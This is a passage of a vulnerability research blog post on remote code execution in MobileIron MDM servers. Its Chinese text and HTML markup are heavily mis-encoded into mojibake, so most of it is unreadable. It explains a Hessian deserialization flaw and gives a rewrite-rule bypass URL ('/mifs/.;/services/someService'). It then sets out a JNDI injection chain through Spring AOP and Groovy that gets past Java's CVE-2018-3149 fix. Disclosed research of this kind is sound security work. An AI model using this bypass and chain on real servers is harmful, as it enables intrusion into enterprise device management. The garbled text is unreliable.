&lt;p&gt;Âõ†Ê≠§ÊàëÂÄëÈÄèÈÅéÂÖ¨ÈñãÊÉÖÂ†±ÂàóËàâ‰∫ÜÂ∏ÇÈù¢‰∏äÂ∏∏Ë¶ãÁöÑ MDM Áî¢ÂìÅÔºå‰∏¶ÈÖçÂêàÂêÑÂÆ∂ÁâπÂæµÂ∞çÂÖ®‰∏ñÁïåÈÄ≤Ë°å‰∫Ü‰∏ÄÊ¨°ÊéÉÊèèÔºåÁôºÁèæÊúÄÂ§ö‰ºÅÊ•≠‰ΩøÁî®ÁöÑ MDM ÁÇ∫ VMware AirWatch Ëàá MobileIron ÈÄôÂÖ©Â•óÁî¢ÂìÅ! Ëá≥ÊñºË¶ÅÊåëÂì™‰∏ÄÂÆ∂Á†îÁ©∂Âë¢? ÊàëÂÄëÈÅ∏Êìá‰∫ÜÂæåËÄÖÔºåÈô§‰∫ÜËÄÉÈáèÂà∞Â§ßÈÉ®ÂàÜÁöÑÂÆ¢Êà∂ÈÉΩÊòØ‰ΩøÁî® MobileIron Â§ñÔºåÂè¶Â§ñ‰∏ÄÂÄãÂê∏ÂºïÊàëÁöÑÈªûÂâáÊòØ Facebook ‰πüÊòØ‰ªñÂÄëÁöÑÂÆ¢Êà∂! ÂæûÊàëÂÄëÂú® 2016 Âπ¥ÁôºË°®ÁöÑ &lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;How I Hacked Facebook, and Found Someone‚Äôs Backdoor Script&lt;/a&gt; Á†îÁ©∂‰∏≠ÔºåÂ∞±Â∑≤ÁôºÁèæ Facebook ‰ΩøÁî® MobileIron ‰ΩúÁÇ∫‰ªñÂÄëÁöÑ MDM Ëß£Ê±∫ÊñπÊ°à!&lt;/p&gt;

&lt;p&gt;Ê†πÊìö MobileIron ÂÆòÊñπÁ∂≤Á´ôÊèèËø∞ÔºåËá≥Â∞ëÊúâ 20000+ ÁöÑ‰ºÅÊ•≠‰ΩøÁî® MobileIron Áï∂Êàê‰ªñÂÄëÁöÑ MDM Ëß£Ê±∫ÊñπÊ°àÔºåËÄåÊ†πÊìöÊàëÂÄëÂØ¶ÈöõÂ∞çÂÖ®‰∏ñÁïåÁöÑÊéÉÊèèÔºå‰πüËá≥Â∞ëÊúâ 15% ‰ª•‰∏äÁöÑË≤°ÂØå‰∏ñÁïå 500 Â§ß‰ºÅÊ•≠‰ΩøÁî® MobileIron ‰∏î&lt;strong&gt;ÊõùÈú≤Âú®Â§ñÁ∂≤&lt;/strong&gt;(ÂØ¶Èöõ‰∏ä‰∏ÄÂÆöÊõ¥Â§ö)ÔºåÂõ†Ê≠§ÔºåÂ∞ãÊâæ MobileIron ÁöÑÊºèÊ¥û‰πüÂ∞±ËÆäÊàêÊàëÂÄëÁöÑÈ¶ñË¶ÅÁõÆÊ®ô!&lt;/p&gt;

&lt;h2 id=&quot;Â¶Ç‰ΩïÈñãÂßãÁ†îÁ©∂&quot;&gt;Â¶Ç‰ΩïÈñãÂßãÁ†îÁ©∂&lt;/h2&gt;

&lt;p&gt;Âæû&lt;a href=&quot;https://www.cvedetails.com/vulnerability-list/vendor_id-13968/Mobileiron.html&quot;&gt;ÈÅéÂæÄÂá∫ÁèæÈÅéÁöÑÊºèÊ¥û&lt;/a&gt;ÂèØ‰ª•ÂæóÁü• MobileIron ‰∏¶Ê≤íÊúâÂèóÂà∞Â§™Â§öÂÆâÂÖ®‰∫∫Âì°Á†îÁ©∂ÔºåÂÖ∂‰∏≠ÂéüÂõ†Èô§‰∫Ü MDM ÈÄôÂÄãÊîªÊìäÂêëÈáèÂ∞öÊú™Âª£ÁÇ∫‰∫∫Áü•Â§ñÔºåÂè¶‰∏ÄÂÄãÂèØËÉΩÊòØÂõ†ÁÇ∫ÈóúÊñº MobileIron ÁöÑÁõ∏ÈóúÈüåÈ´îÂ§™Èõ£ÂèñÂæóÔºåÁ†îÁ©∂‰∏ÄÊ¨æË®≠ÂÇôÊúÄÂ§ßÁöÑÂïèÈ°åÊòØÂ¶Ç‰ΩïÂæûÁ¥îÁ≤πÁöÑÈªëÁÆ±ÔºåÂà∞ÂèØ‰ª•ÂàÜÊûêÁöÑÁÅ∞ÁÆ±„ÄÅÁîöËá≥ÁôΩÁÆ±! Áî±ÊñºÁÑ°Ê≥ïÂæûÂÆòÁ∂≤‰∏ãËºâÈüåÈ´îÔºåÊàëÂÄëËä±Ë≤ª‰∫ÜÂ•ΩÂπæÂ§©ÂòóË©¶ËëóÂêÑÁ®ÆÈóúÈçµÂ≠óÂú®Á∂≤Ë∑Ø‰∏äÂ∞ãÊâæÂèØÂà©Áî®ÁöÑÂÖ¨ÈñãË≥áË®äÔºåÊúÄÂæåÊâçÂú® Goolge Search Á¥¢ÂºïÂà∞ÁöÑÂÖ∂‰∏≠‰∏ÄÂÄãÂÖ¨ÈñãÁ∂≤Á´ôÊ†πÁõÆÈåÑ‰∏äÁôºÁèæÁñë‰ººÊòØÈñãÁôºÂïÜÊ∏¨Ë©¶Áî®ÁöÑ RPM ÂåÖ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‰∏ãËºâÂõûÁöÑÈüåÈ´îÁÇ∫ 2018 Âπ¥ÂàùÁöÑÁâàÊú¨ÔºåÈõ¢ÁèæÂú®‰πüÊúâÂæàÈï∑‰∏ÄÊÆµÊôÇÈñìÔºå‰πüË®±Ê†∏ÂøÉÁ®ãÂºèÁ¢º‰πüÂ§ßÊîπÈÅéÔºå‰∏çÈÅéÁ∏ΩÊØî‰ªÄÈ∫ºÈÉΩÊ≤íÊúâÂ•ΩÔºåÂõ†Ê≠§ÊàëÂÄëÂ∞±ÂæûÈÄô‰ªΩÊ™îÊ°àÈñãÂßãÁ†îÁ©∂Ëµ∑„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;em&gt;ÂÇôË®ª: Á∂ìÈÄöÁü• MobileIron ÂÆòÊñπÂæåÔºåÊ≠§ÈñãÁôºÂïÜÁ∂≤Á´ôÂ∑≤ÈóúÈñâ„ÄÇ&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;Â¶Ç‰ΩïÂ∞ãÊâæÊºèÊ¥û&quot;&gt;Â¶Ç‰ΩïÂ∞ãÊâæÊºèÊ¥û&lt;/h2&gt;

&lt;p&gt;Êï¥ÂÄã MobileIron ‰ΩøÁî® Java ‰ΩúÁÇ∫‰∏ªË¶ÅÈñãÁôºË™ûË®ÄÔºåÂ∞çÂ§ñÈñãÊîæÁöÑÈÄ£Êé•Âü†ÁÇ∫ 443, 8443, 9997ÔºåÂêÑÂÄãÈÄ£Êé•Âü†Â∞çÊáâÂäüËÉΩÂ¶Ç‰∏ã:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;443 ÁÇ∫‰ΩøÁî®ËÄÖË£ùÁΩÆË®ªÂÜä‰ªãÈù¢&lt;/li&gt;
  &lt;li&gt;8443 ÁÇ∫Ë®≠ÂÇôÁÆ°ÁêÜ‰ªãÈù¢&lt;/li&gt;
  &lt;li&gt;9997 ÁÇ∫‰∏ÄÂÄã MobileIron ÁßÅÊúâÁöÑË£ùÁΩÆÂêåÊ≠•ÂçîÂÆö (MI Protocol)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;‰∏âÂÄãÈÄ£Êé•Âü†ÁöÜÈÄèÈÅé TLS ‰øùË≠∑ÈÄ£Á∑öÁöÑÂÆâÂÖ®ÊÄßÂèäÂÆåÊï¥ÊÄßÔºåÁ∂≤È†ÅÈÉ®ÂàÜÂâáÊòØÈÄèÈÅé Apache ÁöÑ Reverse Proxy Êû∂ÊßãÂ∞áÈÄ£Á∑öÂ∞éËá≥ÂæåÊñπÔºåÁî± Tomcat ÈÉ®ÁΩ≤ÁöÑÁ∂≤È†ÅÊáâÁî®ËôïÁêÜÔºåÁ∂≤È†ÅÊáâÁî®ÂâáÁî± Spring MVC ÈñãÁôº„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Áî±Êñº‰ΩøÁî®ÁöÑÊäÄË°ìÊû∂ÊßãÁõ∏Â∞çÊñ∞ÔºåÂÇ≥Áµ±È°ûÂûãÁöÑÊºèÊ¥ûÂ¶Ç SQL Injection ‰πüËºÉÈõ£ÂæûÂñÆ‰∏ÄÁöÑÈªû‰æÜÁôºÁèæÔºåÂõ†Ê≠§ÁêÜËß£Á®ãÂºèÈÇèËºØ‰∏¶ÈÖçÂêàÊû∂ÊßãÂ±§Èù¢ÁöÑÊîªÊìäÂ∞±ËÆäÊàêÊàëÂÄëÈÄôÊ¨°Â∞ãÊâæÊºèÊ¥ûÁöÑ‰∏ªË¶ÅÁõÆÊ®ô!&lt;/p&gt;

&lt;p&gt;ÈÄôÊ¨°ÁöÑÊºèÊ¥û‰πüÂæàÁ∞°ÂñÆÔºå‰∏ªË¶ÅÊòØ Web Service ‰ΩøÁî®‰∫Ü Hessian Ê†ºÂºèËôïÁêÜË≥áÊñôÈÄ≤ËÄåÁî¢Áîü‰∫ÜÂèçÂ∫èÂàóÂåñÁöÑÂº±Èªû! ÈõñÁÑ∂ÊºèÊ¥û‰∏ÄÂè•Ë©±Â∞±ÂèØ‰ª•Ëß£ÈáãÂÆå‰∫ÜÔºå‰ΩÜÊáÇÁöÑ‰∫∫ÊâçÁü•ÈÅìÂèçÂ∫èÂàóÂåñ‰∏¶‰∏ç‰ª£Ë°®‰Ω†ÂèØ‰ª•ÂÅö‰ªª‰Ωï‰∫ãÔºåÊé•‰∏ã‰æÜÁöÑÂà©Áî®ÊâçÊòØÁ≤æÂΩ©ÁöÑÂú∞Êñπ!&lt;/p&gt;

&lt;p&gt;ÁèæÂú®Â∑≤Áü• MobileIron Âú®ËôïÁêÜ Web Service ÁöÑÂú∞ÊñπÂ≠òÂú® Hessian ÂèçÂ∫èÂàóÂåñÊºèÊ¥û! ‰ΩÜÊºèÊ¥ûÂ≠òÂú®Ôºå‰∏¶‰∏ç‰ª£Ë°®ÊàëÂÄëÁ¢∞ÂæóÂà∞ÊºèÊ¥ûÔºåÂèØ‰ª•Ëß∏Áôº Hessian ÂèçÂ∫èÂàóÂåñÁöÑË∑ØÂæëÂàÜÂà•Âú®:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;‰∏ÄËà¨‰ΩøÁî®ËÄÖ‰ªãÈù¢ - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://mobileiron/mifs/services/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;ÁÆ°ÁêÜ‰ªãÈù¢ - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://mobileiron:8443/mifs/services/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÁÆ°ÁêÜ‰ªãÈù¢Âü∫Êú¨‰∏äÊ≤íÊúâ‰ªª‰ΩïÈòªÊìãÔºåÂèØ‰ª•ËºïÈ¨ÜÁöÑÁ¢∞Âà∞ Web ServiceÔºåËÄå‰∏ÄËà¨‰ΩøÁî®ËÄÖ‰ªãÈù¢ÁöÑ Web Service ÂâáÁÑ°Ê≥ïÂ≠òÂèñÔºåÈÄôÂ∞çÊàëÂÄë‰æÜË™™ÊòØ‰∏ÄÂÄãËá¥ÂëΩÊÄßÁöÑÊâìÊìäÔºåÁî±ÊñºÂ§ßÈÉ®ÂàÜ‰ºÅÊ•≠ÁöÑÁ∂≤Ë∑ØÊû∂Êßã‰∏¶‰∏çÊúÉÂ∞áÁÆ°ÁêÜ‰ªãÈù¢ÁöÑÈÄ£Êé•Âü†ÈñãÊîæÂú®Â§ñÈÉ®Á∂≤Ë∑ØÔºåÂõ†Ê≠§Âè™ËÉΩÊîªÊìäÁÆ°ÁêÜ‰ªãÈù¢Â∞çÊñºÁöÑÂà©Áî®Á®ãÂ∫¶‰∏¶‰∏çÂ§ßÔºåÂõ†Ê≠§ÊàëÂÄëÂøÖÈ†àÂ∞ãÊâæÂÖ∂‰ªñÁöÑÊñπÂºèÂéªËß∏ÁôºÈÄôÂÄãÊºèÊ¥û!&lt;/p&gt;

&lt;p&gt;‰ªîÁ¥∞ËßÄÂØü MobileIron ÁöÑÈòªÊìãÊñπÂºèÔºåÁôºÁèæÂÆÉÊòØÈÄèÈÅéÂú® Apache ‰∏ä‰ΩøÁî® Rewrite Rules ÂéªÈòªÊìãÂ∞ç‰∏ÄËà¨‰ΩøÁî®ËÄÖ‰ªãÈù¢ Web Service ÁöÑÂ≠òÂèñ:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/mifs/services/(.*)$ https://%{SERVER_NAME}:8443/mifs/services/$1 [R=307,L]
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/mifs/services [F]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂóØÔºåÂæàÊ£í! ‰ΩøÁî® Reverse Proxy Êû∂ÊßãËÄå‰∏îÊòØÂú®ÂâçÈù¢ÈÇ£Â±§ÂÅöÈòªÊìãÔºå‰Ω†ÊòØÂê¶ÊÉ≥Âà∞‰ªÄÈ∫ºÂë¢?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Ê≤íÈåØ! Â∞±ÊòØÊàëÂÄëÂú® &lt;a href=&quot;https://github.com/orangetw/My-CTF-Web-Challenges#blackbox&quot;&gt;2015 Âπ¥&lt;/a&gt;ÁôºÁèæÔºå‰∏¶‰∏îÂú® &lt;a href=&quot;https://www.blackhat.com/us-18/briefings.html#breaking-parser-logic-take-your-path-normalization-off-and-pop-0days-out&quot;&gt;Black Hat USA 2018&lt;/a&gt; ‰∏äÊâÄÁôºË°®ÁöÑÈáùÂ∞ç Reverse Proxy Êû∂ÊßãÁöÑÊñ∞ÊîªÊìäÈù¢ &lt;a href=&quot;https://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html&quot;&gt;Breaking Parser Logic&lt;/a&gt;! ÈÄôÂÄãÂÑ™ÁßÄÁöÑÊäÄÂ∑ßÊúÄËøë‰πüË¢´ÂæàÂ•ΩÁöÑÂà©Áî®Âú® &lt;a href=&quot;https://support.f5.com/csp/article/K52145254&quot;&gt;CVE-2020-5902&lt;/a&gt;ÔºåF5 BIG-IP TMUI ÁöÑÈÅ†Á´ØÁ®ãÂºèÁ¢ºÂü∑Ë°å‰∏ä!&lt;/p&gt;

&lt;p&gt;ÈÄèÈÅé Apache Ëàá Tomcat Â∞çË∑ØÂæëÁêÜËß£ÁöÑ‰∏ç‰∏ÄËá¥ÔºåÊàëÂÄëÂèØ‰ª•ÈÄèÈÅé‰ª•‰∏ãÊñπÂºèÁπûÈÅé Rewrite Rule ÂÜç‰∏ÄÊ¨°ÊîªÊìä Web Service!&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://mobileiron/mifs/.;/services/someService
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Á¢∞! Âõ†Ê≠§ÁèæÂú®‰∏çÁÆ°ÊòØ 8443 ÁöÑÁÆ°ÁêÜ‰ªãÈù¢ÈÇÑÊòØ 443 ÁöÑ‰∏ÄËà¨‰ΩøÁî®ËÄÖ‰ªãÈù¢ÔºåÊàëÂÄëÈÉΩÂèØ‰ª•Á¢∞Âà∞Êúâ Hessian ÂèçÂ∫èÂàóÂåñÂ≠òÂú®ÁöÑ Web Service ‰∫Ü!&lt;/p&gt;

&lt;h2 id=&quot;Â¶Ç‰ΩïÂà©Áî®ÊºèÊ¥û&quot;&gt;Â¶Ç‰ΩïÂà©Áî®ÊºèÊ¥û&lt;/h2&gt;

&lt;p&gt;ÁèæÂú®ËÆìÊàëÂÄëÂõûÂà∞ Hessian ÂèçÂ∫èÂàóÂåñÁöÑÂà©Áî®‰∏ä! ÈáùÂ∞ç Hessian ÂèçÂ∫èÂàóÂåñÔºå&lt;a href=&quot;https://github.com/mbechler&quot;&gt;Moritz Bechler&lt;/a&gt; Â∑≤Á∂ìÂú®‰ªñÁöÑ &lt;a href=&quot;https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf&quot;&gt;Java Unmarshaller Security&lt;/a&gt; ‰∏≠ÂÅö‰∫Ü‰∏ÄÂÄãÂæàË©≥Á¥∞ÁöÑÁ†îÁ©∂Â†±Âëä! Âæû‰ªñÊâÄÈñãÊ∫êÁöÑ &lt;a href=&quot;https://github.com/mbechler/marshalsec&quot;&gt;marshalsec&lt;/a&gt; ÂéüÂßãÁ¢º‰∏≠ÔºåÊàëÂÄë‰πüÂ≠∏ÁøíÂà∞ Hessian Âú®ÂèçÂ∫èÂàóÂåñÈÅéÁ®ã‰∏≠Èô§‰∫ÜÈÄèÈÅé HashMap Ëß∏Áôº &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;equals()&lt;/code&gt; ‰ª•Âèä &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcode()&lt;/code&gt; Á≠âËß∏ÁôºÈªûÂ§ñÔºå‰πüÂèØÈÄèÈÅé &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XString&lt;/code&gt; ‰∏≤Âá∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;toString()&lt;/code&gt;ÔºåËÄåÁõÆÂâçÈóúÊñº Hessian ÂèçÂ∫èÂàóÂåñÂ∑≤Â≠òÂú®ÁöÑÂà©Áî®ÈèàÊúâÂõõÊ¢ù:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Apache XBean&lt;/li&gt;
  &lt;li&gt;Caucho Resin&lt;/li&gt;
  &lt;li&gt;Spring AOP&lt;/li&gt;
  &lt;li&gt;ROME EqualsBean/ToStringBean&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ËÄåÊ†πÊìöÊàëÂÄëÁöÑÁõÆÊ®ôÁí∞Â¢ÉÔºåÂèØ‰ª•Ëß∏ÁôºÁöÑÂè™Êúâ Spring AOP ÈÄôÊ¢ùÂà©Áî®Èèà!&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;¬†&lt;/th&gt;
      &lt;th&gt;Name&lt;/th&gt;
      &lt;th&gt;Effect&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;Apache XBean&lt;/td&gt;
      &lt;td&gt;JNDI Ê≥®ÂÖ•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;Caucho Resin&lt;/td&gt;
      &lt;td&gt;JNDI Ê≥®ÂÖ•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;‚àö&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;Spring AOP&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;JNDI Ê≥®ÂÖ•&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;ROME EqualsBean&lt;/td&gt;
      &lt;td&gt;RCE&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;ÁÑ°Ë´ñÂ¶Ç‰ΩïÔºåÊàëÂÄëÁèæÂú®Êúâ‰∫Ü JNDI Ê≥®ÂÖ•ÂæåÔºåÊé•‰∏ã‰æÜÂè™Ë¶ÅÈÄèÈÅé &lt;a href=&quot;https://twitter.com/pwntester&quot;&gt;Alvaro Mu√±oz&lt;/a&gt; Ëàá &lt;a href=&quot;https://twitter.com/olekmirosh&quot;&gt;Oleksandr Mirosh&lt;/a&gt; Âú® Black Hat USA 2016 ‰∏äÊâÄÁôºË°®ÁöÑ &lt;a href=&quot;https://www.blackhat.com/us-16/briefings.html#a-journey-from-jndi-ldap-manipulation-to-remote-code-execution-dream-land&quot;&gt;A Journey From JNDI/LDAP to Remote Code Execution Dream Land&lt;/a&gt; Â∞±ÂèØ‰ª•ÂèñÂæóÈÅ†Á´ØÁ®ãÂºèÁ¢ºÂü∑Ë°å‰∫Ü‚Ä¶ ÁîòÂÆâÂÖß?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Ëá™Âæû &lt;a href=&quot;https://twitter.com/pwntester&quot;&gt;Alvaro Mu√±oz&lt;/a&gt; Ëàá &lt;a href=&quot;https://twitter.com/olekmirosh&quot;&gt;Oleksandr Mirosh&lt;/a&gt; Âú® Black Hat ÁôºË°®‰∫ÜÈÄôÂÄãÊñ∞ÁöÑÊîªÊìäÂêëÈáèÂæåÔºå‰∏çÁü•ÈÅìÂπ´Âä©‰∫ÜÂ§öÂ∞ëÂ§ßÂ§ßÂ∞èÂ∞èÁöÑÈß≠ÂÆ¢ÔºåÁîöËá≥ÊúÉÊúâ‰∫∫Ë™çÁÇ∫„ÄåÈÅáÂà∞ÂèçÂ∫èÂàóÂåñÂ∞±Áî® JNDI ÈÄÅÂ∞±Â∞ç‰∫Ü!„ÄçÔºå‰ΩÜËá™Âæû 2018 Âπ¥ÂçÅÊúàÔºåJava ÁµÇÊñºÊääÈóúÊñº JNDI Ê≥®ÂÖ•ÁöÑÊúÄÂæå‰∏ÄÂ°äÊãºÂúñÁµ¶‰øÆÂæ©ÔºåÈÄôÂÄã‰øÆÂæ©Ë¢´Ë®òËºâÂú® &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-3149&quot;&gt;CVE-2018-3149&lt;/a&gt; ‰∏≠ÔºåËá™Ê≠§‰πãÂæåÔºåÊâÄÊúâ Java È´òÊñº 8u181, 7u191, 6u201 ÁöÑÁâàÊú¨ÁöÜÁÑ°Ê≥ïÈÄèÈÅé JNDI/LDAP ÁöÑÊñπÂºèÂü∑Ë°åÁ®ãÂºèÁ¢ºÔºåÂõ†Ê≠§Ëã•Ë¶ÅÂú®ÊúÄÊñ∞ÁâàÊú¨ÁöÑ MobileIron ‰∏äÂØ¶ÁèæÊîªÊìäÔºåÊàëÂÄëÂã¢ÂøÖÂæóÈù¢Â∞çÈÄôÂÄãÂïèÈ°å!&lt;/p&gt;

&lt;p&gt;ÈóúÊñº CVE-2018-3149ÔºåÊòØÈÄèÈÅéÂ∞á &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.sun.jndi.ldap.object.trustURLCodebase&lt;/code&gt; ÁöÑÈ†êË®≠ÂÄºÊîπÁÇ∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;False&lt;/code&gt; ÁöÑÊñπÂºè‰ª•ÈÅîÂà∞Á¶ÅÊ≠¢ÊîªÊìäËÄÖ‰∏ãËºâÈÅ†Á´Ø Bytecode ÂèñÂæóÂü∑Ë°åÁ®ãÂºèÁ¢º„ÄÇ&lt;/p&gt;

&lt;p&gt;‰ΩÜÂπ∏ÈÅãÁöÑÊòØÔºåÊàëÂÄë‰æùÁÑ∂ÂèØ‰ª•ÈÄèÈÅé JNDI ÁöÑ Naming Reference Âà∞Êú¨Ê©üÊó¢ÊúâÁöÑ Class Factory ‰∏ä! ÈÄèÈÅéÈ°û‰ºº &lt;a href=&quot;https://en.wikipedia.org/wiki/Return-oriented_programming&quot;&gt;Return-Oriented Programming&lt;/a&gt; ÁöÑÊ¶ÇÂøµÔºåÂ∞ãÊâæÊú¨Ê©ü ClassPath ‰∏≠ÂèØÂà©Áî®ÁöÑÈ°ûÂà•ÂéªÂÅöÊõ¥ÈÄ≤‰∏ÄÊ≠•ÁöÑÂà©Áî®ÔºåË©≥Á¥∞ÁöÑÊâãÊ≥ïÂèØÂèÉËÄÉÁî± &lt;a href=&quot;https://twitter.com/artsploit&quot;&gt;Michael Stepankin&lt;/a&gt; Âú® 2019 Âπ¥Âπ¥ÂàùÊâÄÁôºË°®ÁöÑ &lt;a href=&quot;https://www.veracode.com/blog/research/exploiting-jndi-injections-java&quot;&gt;Exploiting JNDI Injections in Java&lt;/a&gt;ÔºåË£°Èù¢Ë©≥Á¥∞ÊïòËø∞‰∫ÜÂ¶Ç‰ΩïÈÄèÈÅé Tomcat ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; ÂéªËºâÂÖ• &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; ÈÅîÊàê‰ªªÊÑèÁ®ãÂºèÁ¢ºÂü∑Ë°å!&lt;/p&gt;

&lt;p&gt;ÈÄôÊ¢ùË∑ØÁúã‰ººÈÄöÊö¢Ôºå‰ΩÜÂØ¶Èöõ‰∏äÂçªÂ∑ÆÈÇ£È∫º‰∏ÄÈªûÔºåÁî±Êñº &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; Âú® Tomcat 8 ÂæåÊâçË¢´ÂºïÂÖ•ÔºåÂõ†Ê≠§‰∏äÈù¢ÁöÑÁπûÈÅéÊñπÂºèÂè™ËÉΩÂú® Tomcat ÁâàÊú¨Â§ßÊñº 8 ÂæåÁöÑÊüêÂÄãÁâàÊú¨ÊâçËÉΩÊàêÂäüÔºåËÄåÊàëÂÄëÁöÑÁõÆÊ®ôÂâáÊòØ Tomcat 7.xÔºåÂõ†Ê≠§ÂæóÁÇ∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; Â∞ãÊâæ‰∏ÄÂÄãÊñ∞ÁöÑÂà©Áî®Èèà! ËÄåÁ∂ìÈÅéÊêúÂ∞ãÔºåÁôºÁèæÂú® &lt;a href=&quot;https://github.com/welk1n&quot;&gt;Welkin&lt;/a&gt; ÁöÑ&lt;a href=&quot;https://www.cnblogs.com/Welk1n/p/11066397.html&quot;&gt;ÊñáÁ´†&lt;/a&gt;‰∏≠ÊâÄÊèêÂà∞:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Èô§‰∫Ü javax.el.ELProcessorÔºåÂΩìÁÑ∂‰πüËøòÊúâÂæàÂ§öÂÖ∂‰ªñÁöÑÁ±ªÁ¨¶ÂêàÊù°‰ª∂ÂèØ‰ª•‰Ωú‰∏∫ beanClass Ê≥®ÂÖ•Âà∞ BeanFactory ‰∏≠ÂÆûÁé∞Âà©Áî®„ÄÇ‰∏æ‰∏™‰æãÂ≠êÔºåÂ¶ÇÊûúÁõÆÊ†áÊú∫Âô® classpath ‰∏≠Êúâ groovy ÁöÑÂ∫ìÔºåÂàôÂèØ‰ª•ÁªìÂêà‰πãÂâç Orange Â∏àÂÇÖÂèëËøáÁöÑ &lt;a href=&quot;https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html&quot;&gt;Jenkins ÁöÑÊºèÊ¥ûÂÆûÁé∞Âà©Áî®&lt;/a&gt;&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ÁõÆÊ®ôÁöÑ ClassPath ‰∏äÂâõÂ•ΩÊúâ Groovy Â≠òÂú®! ÊñºÊòØÊàëÂÄëÂèàËÆì Meta Programming ÂÅâÂ§ß‰∫Ü‰∏ÄÊ¨° :D&lt;/p&gt;

&lt;p&gt;ÁÑ∂ËÄå‰∫ãÂØ¶‰∏äÔºåÁõÆÊ®ô‰º∫ÊúçÂô®‰∏ä Groovy ÁâàÊú¨ÁÇ∫ 1.5.6ÔºåÊòØ‰∏ÄÂÄãË∑ù‰ªäÂçÅÂπ¥ÂâçËÄÅËàäÂà∞‰∏çÊîØÊè¥ Meta Programming ÁöÑÁâàÊú¨ÔºåÊâÄ‰ª•ÊàëÂÄëÊúÄÂæåÈÇÑÊòØÂü∫Êñº Groovy ÁöÑÁ®ãÂºèÁ¢ºÔºåÈáçÊñ∞Â∞ãÊâæ‰∫Ü‰∏ÄÂÄãÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GroovyShell&lt;/code&gt; ‰∏äÁöÑÂà©Áî®Èèà! Ë©≥Á¥∞ÁöÑÂà©Áî®ÈèàÂèØÂèÉËÄÉÊàëÈÄÅÁµ¶ &lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Bypass&quot;&gt;JNDI-Injection-Bypass&lt;/a&gt; ÁöÑÈÄôÂÄã &lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Bypass/pull/1&quot;&gt;Pull Request&lt;/a&gt;!&lt;/p&gt;

&lt;h2 id=&quot;ÊîªÊìä-facebook&quot;&gt;ÊîªÊìä Facebook&lt;/h2&gt;

